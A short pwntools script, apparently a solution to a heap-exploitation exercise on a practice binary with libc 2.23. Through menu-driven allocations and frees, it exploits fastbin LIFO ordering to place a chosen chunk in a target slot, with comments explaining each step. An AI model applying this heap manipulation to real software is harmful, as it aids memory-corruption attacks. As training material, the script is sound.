from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.23/libc-2.23.so'
env = {}

# Binary setup
elf_name = './.birdie'

elf = ELF(elf_name)
if libc_name != '':
        libc = ELF(libc_name)
        env = {"LD_PRELOAD": libc.path}

# Process creation 
if mode == 'DEBUG':
        p = gdb.debug([elf.path], env=env, gdbscript='''
dir ../../../libc_versions/2.23/
''')

# Malloc
def malloc():
	p.sendlineafter(">", "1") 

# Free
def free():
	p.sendlineafter(">", "2") 


'''
At the start of the program, the heap has allocated SIX items. 

We want the SECOND item to become the new TENTH item. 
The is fastbin so it is LAST IN FIRST OUT (LIFO). 
'''

# Get the COUNT of stored items up to 9
for i in range(4):
	malloc()

'''
Now, the fastbin is COMPLETELY empty and we want the current SECOND item
to become the new TENTH item. 

So, we will free TWO items. Because the fastbin is LIFO the SECOND item is 
now at the FRONT of the linked list. 
'''

# Free twice to put the SECOND item to the TOP of the fastbin
free()
free()

# With the SECOND item at the top of the fastbin, allocate it
malloc()

p.interactive()
